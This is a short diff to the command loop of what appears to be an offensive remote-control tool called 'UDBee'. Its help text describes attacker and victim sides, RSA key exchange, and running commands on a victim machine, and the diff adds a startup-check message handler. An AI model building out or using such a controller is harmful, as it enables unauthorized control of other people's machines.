@@ -326,7 +326,9 @@ def main():
             elif command.lower() == "help":
                 print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>target_chunk INT</ansigreen> : <ansiblue>control target chunk size (default is 256 bytes)</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                 continue
-
+            elif command.startswith("STARTUP_CHECK"):
+                send_msg("STARTUP_CHECK", True)
+                continue
             elif command.startswith("gen_keys"):
                 exchange_keys()
                 continue
